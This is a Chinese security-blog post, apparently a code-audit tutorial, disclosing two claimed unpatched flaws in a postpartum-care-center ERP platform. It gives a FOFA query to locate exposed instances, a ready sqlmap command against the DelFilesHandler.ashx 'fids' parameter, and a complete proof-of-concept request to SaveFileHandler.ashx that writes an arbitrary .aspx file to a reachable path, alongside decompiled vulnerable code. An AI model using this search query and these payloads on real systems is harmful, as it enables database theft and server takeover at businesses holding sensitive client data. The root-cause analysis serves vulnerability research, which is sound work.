#  [跟着静师傅学代码审计]月子会所ERP管理云平台0day审计  
原创 静师傅
                    静师傅  安静安全   2026-02-09 09:06  
  
点击上方「蓝字」，关注我们  
  
01  
  
![](https://mmbiz.qpic.cn/mmbiz_svg/Q3auHgzwzM7zaMe7pKxBpZibpoqdux8GUpc2ibrfHicyjLdtRLsYUPsap2RfSLEwjiaglicjpUkSmpCsQl2EHYDC6PdTZmV55P9CjPib7P5CKIU5xdicMIb8UwdiaA/640?wx_fmt=svg&from=appmsg "")  
  
# SQL注入漏洞0day  
  
  
![](https://mmbiz.qpic.cn/mmbiz_svg/Q3auHgzwzM4zubNfSgqEvUAfUDadJjJ8nSmUicfOaoLCQEiauyYdgia2liayjwyfoWphRRftribl1nVianN22HLv8u84DhaV7ndlXeVnqQAm9QgWrwZiaj9cNwwicA/640?wx_fmt=svg&from=appmsg "")  
  
  
fofa:  
```
body="月子护理ERP管理平台" || body="妈妈宝盒客户端.rar" || body="Page/Login/Login3.aspx"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/8LGv6icfib1HUJwuv2iatG4RsG9jcrJUUUuicHLyKcSREFH6qjHXu8OicWA1fRp7ibRibLNeXuib4UMgdQtib0iajnCgwce7IRmTGrnfU5OBbgxs17j6I/640?wx_fmt=png&from=appmsg "")  
  
sqlmap命令:  
```
python sqlmap.py -u "http://IP:PORT/Page/upload/DelFilesHandler.ashx?fids=1" -p fids --batch
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/8LGv6icfib1HXsmzl0SkZZAzWTAg9iahWK9Jn4jEGPkB3CpA00QTPJfNia3cgz5n98HLgHKBgKS2EB9v5YQ0NVn4xIru16efKEqHa4oHvZyfvwo/640?wx_fmt=png&from=appmsg "")  
  
漏洞分析:  
  
漏洞位于  
  
\Page\upload\DelFilesHandler.ashx  
  
![](https://mmbiz.qpic.cn/mmbiz_png/8LGv6icfib1HUia4ZbBxxz3dMDMeEqCK0UdEbXKG6v3icuIqz4BQC3B4Vx26Svfp5b0gAFad4UCmyCBoZAPuFSmd0ibKjgCFMfF3VDL6UkViaojVU/640?wx_fmt=png&from=appmsg "")  
  
对应DLL文件为  
WebApp4.0.dll  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/8LGv6icfib1HXdiaUSWuZLaYFlLiayemABt6A4IQN9GFsV7FH8HLmag6PGVjhRauw1kfqOVzkSUyaYkFtLGHZBn8uVnChLDleH8oUCa6xAjCRWY/640?wx_fmt=png&from=appmsg "")  
  
反编译DLL后来到  
WebApp4._0.Page.upload下的DelFilesHandler方法  
  
![](https://mmbiz.qpic.cn/mmbiz_png/8LGv6icfib1HWztsN1bewULoanzBbuaxNDO3mPtdwwaeP4dYUU8ibGYO6ibdBAhY7FrAcgMBNfJOGYbXaMqJ3kAkNWhFcicTvyrJw4ibXupD4IK5g/640?wx_fmt=png&from=appmsg "")  
  
主要问题代码:  
```
string sql = $"select fileUrl,fileName from t_FileUploadDetail where 1=1 and Id in({fids})";
DataTable dt = BRBase<t_FileUploadDetail>.SearchOnDataSet(sql).Tables[0];
```  
  
1.fids参数直接从 context.Request.QueryString["fids"] 获取。  
  
2.没有进行任何验证、过滤或参数化处理。  
  
3.直接拼接到SQL语句中形成SQL注入漏洞。  
  
02  
  
![](https://mmbiz.qpic.cn/mmbiz_svg/Q3auHgzwzM5mB6zED8j1iaicwdjN1JVJCibV2kBlO5sk9xFDLQSb686pxrgv8nMLrnBrbqQ1egjrT6ZWTwFvBNUzdxezLrGkT2h7AwF6TVbfT1lr30E2wColw/640?wx_fmt=svg&from=appmsg "")  
  
# 文件上传0day  
  
  
![](https://mmbiz.qpic.cn/mmbiz_svg/Q3auHgzwzM6GW8BZt4vqIyEmsO1veliaWfLkarYbwAXPQqCkW4BtYA15ib0GFgwlVJ0TG2n1iaVaSIwdicyzhX1miaeRFAsEibtD556XRYLEIJMAibmj7WYDHmFcA/640?wx_fmt=svg&from=appmsg "")  
  
  
先给出POC数据包:  
```
POST /Page/upload/SaveFileHandler.ashx HTTP/1.1
Host: IP:PORT
Content-Type: application/json
Content-Length: 116

{
  "url": "OA/",
  "htmlname": "YYDS.aspx",
  "htmlstr": "<%= new Random().Next(100000,999999) %>"
}
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/8LGv6icfib1HXWk22UWoorwcXpeetbzh32bgsnGpVwSWiaKTgvDibHxFtTic61eiaCgOUA61VSMZHZlWfNMiahvzPibpW1tnnp2OD7MqXQNJCjBYia18/640?wx_fmt=png&from=appmsg "")  
  
上传成功后访问路径:  
  
http://IP:PORT/OA/YYDS.aspx  
  
![](https://mmbiz.qpic.cn/mmbiz_png/8LGv6icfib1HXRtgM0xQMRHCJKnF5PBhX4822kEkYHAWV5O6pSMLSItVQ9j94kHQ5J2XyeIIiaxDN1p3icGtw8FyVicbyv8R9e1APjNrbyqmUzus/640?wx_fmt=png&from=appmsg "")  
  
成功解析aspx  
  
漏洞分析:  
  
漏洞位于  
  
\Page\upload\SaveFileHandler.ashx  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/8LGv6icfib1HWCuJgxia80ia1S7N8XibWCl1Q3IWs3KyCUI0j6Yf8hug6qDahR6Qq0eQz7IvPAWcb1vybjh93EsTfsZrMqiak76PI5CU5yJPxpmaw/640?wx_fmt=png&from=appmsg "")  
  
对应DLL文件也为WebApp4.0.dll  
  
![](https://mmbiz.qpic.cn/mmbiz_png/8LGv6icfib1HVl6GWlVrLPDQmk1QA2E5KicyaKbtHKc16j3o2lmdR2K0d9KVMGEUgjFvTmjkEpcw4yN4BKWpwu2dSSSTuL1ibicyfWPXMvb3slUA/640?wx_fmt=png&from=appmsg "")  
  
反编译DLL后来到WebApp4._0.Page.upload下的SaveFileHandler方法  
  
![](https://mmbiz.qpic.cn/mmbiz_png/8LGv6icfib1HXgx1N1r4tb7ykqIoFv3RuICk9icOr1zSeDpmVCmwopiavjkhE399g61VfU179HBBOwjtYoQ32g1rBVMBICfDRxykGvHl0WZcnrs/640?wx_fmt=png&from=appmsg "")  
  
1.获取参数：通过getparm方法从请求体中获取参数，接收三个参数：url（上传路径）、htmlname（文件名）、htmlstr（内容）。  
  
2.路径拼接：uploadFileName = HttpContext.Current.Server.MapPath("../../" + uploadUrl); 这里使用了MapPath来将相对路径映射为物理路径，但是拼接了用户可控的uploadUrl，默认是到../../路径。  
  
3.保存文件：将传入的htmlstr内容保存到指定的文件中。  
  
4.通过../../路径可以到/OA目录下写入文件。  
  
主要问题代码:  
```
HtmlDocument doc = new HtmlDocument();
doc.LoadHtml(html);
doc.Save(uploadFileName, Encoding.GetEncoding("utf-8"));
```  
  
直接保存到用户控制的路径  
因此形成文件上传漏洞。  
  
![](https://mmbiz.qpic.cn/mmbiz_svg/Q3auHgzwzM7wzEbl6axItmE5szYxQKyfF1pme8LzI3cDf5HTFmsW7L5mo9CQgRI72Dd1yuRPtRpdjq5wdEaaGJzf6ia9fCic8OcicTOrY6cojv4Zh18d3fzaQ/640?wx_fmt=svg&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_svg/Q3auHgzwzM6PD50rP7TwD0QWedQt6gAaZRr7u7tPEPhxiaKpM0N6chzM77f9wfJTDGNEHwM5zCy5q36ZvL7BtiaJkUnuC4IHDksoSxIKv3faYGSBnDwFqAMQ/640?wx_fmt=svg&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_svg/Q3auHgzwzM75zpMmUlQQfx4QwACWyD9YMVHt9FWz3P1eNwKPIlalXnaIkUI9Ij8dhV8ibWYs5pXceFDNsAoCJZRGCvUB52t0eIXpnDlibx06kn9Pw5NoR1wQ/640?wx_fmt=svg&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_svg/Q3auHgzwzM6GMURk8ibw98EksCjiamricH7T7oYhTPA0AGqfHm7rZ1rFAHiamvngaTdBPFscgiaApbFJlodUxx6yDowKsOls0fCNys3IULuCMJEcQlp8aLC8Kgg/640?wx_fmt=svg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_svg/Q3auHgzwzM5lQmK7qTibB4uOKJrSaQJhwHNJbs2ibCQl5byj89wdJsrRYOQbhSM0EaibOUy4SBicIs7MRe0PysqN1kqTMKpRad1aag4YeKlHRGjrSJmnMa6CVQ/640?wx_fmt=svg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/8LGv6icfib1HWtVsWetomZHHRjV2PtmSCqad1gfrAuRXd05uL6hlZOd8M6YLxVmsibDTaUIZSyWbibLtGlOejLptuaTgcKTxb7ia3viazcnrLZHRo/640?wx_fmt=png&from=appmsg "")  
  
# 往期文章推荐  
  
  
![](https://mmbiz.qpic.cn/mmbiz_svg/Q3auHgzwzM5RCuSewGhVWwwOv9BFVbRVw9SmBYok5r363SicZFfDzTictIODJoPRqMaVDviazyBveQ67ickljgUlgossmpRsJjBHvVX7gpVPu495yHib9QnhOZg/640?wx_fmt=svg&from=appmsg "")  
  
[[跟着静师傅学代码审计]itc中心管理服务器审计](https://mp.weixin.qq.com/s?__biz=MzkyNDI2NjQzNg==&mid=2247494835&idx=1&sn=11dc9ba633123039d178ea95daec498c&scene=21#wechat_redirect)  
  
  
![](https://mmbiz.qpic.cn/mmbiz_svg/Q3auHgzwzM7w2nD0t1fMd7Jz93iauh28M0iaEJeML3xRnWh0u0wIed54aIe8B5LxIxibicj0ZkicL1tIuhUUrLTg82QnjuYKY9xibewtxTz0uLelf010uXFzrhUg/640?wx_fmt=svg&from=appmsg "")  
  
[[跟着静师傅学代码审计-全网首发]用友U9 V6.6企业版多组织企业互联网应用平台命令执行+SQL+反序列化](https://mp.weixin.qq.com/s?__biz=MzkyNDI2NjQzNg==&mid=2247494706&idx=1&sn=3a390be197f5c1b0d44e81f6604a764e&scene=21#wechat_redirect)  
  
  
![](https://mmbiz.qpic.cn/mmbiz_svg/Q3auHgzwzM6DkEibB70UEHEthCPpwica65reVtic1riblicTyaiaiay5h3DTsZ71ic4m3CBm2qFDUvaAJic7PmQPtbJZKSj5sbShlPc3WfTYUS7LwOqs6p9I0ZytakQ/640?wx_fmt=svg&from=appmsg "")  
  
[[跟着静师傅学代码审计]智慧校园(安校易)管理系统多处0day](https://mp.weixin.qq.com/s?__biz=MzkyNDI2NjQzNg==&mid=2247494968&idx=1&sn=5dd547d3bc1c343331c423276b179d61&scene=21#wechat_redirect)  
  
  
![](https://mmbiz.qpic.cn/mmbiz_svg/Q3auHgzwzM5icjEkp4Cj7zwia3X3B5GJVFCjLhhB4peVqx2utWTvh85Xicy5hjTiaY2Ye4zLt6DYHgdC1jo2zmEOY7RVuDkpickyq6T8HMmB6tf2oUvxvwGx6hA/640?wx_fmt=svg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_svg/Q3auHgzwzM6yKJiagRRXR65TjbHMzS2Zg5XZmtGC6petQ1icGiaqY7dWxwHnjm7yiaRmicCV2uPQuF6v4NAWBXT0TVrm6QHyhCbvl2U1Yh84lYysrLibNd8jbGjQ/640?wx_fmt=svg&from=appmsg "")  
  
  
点个「在看」，你最好看  
  
  
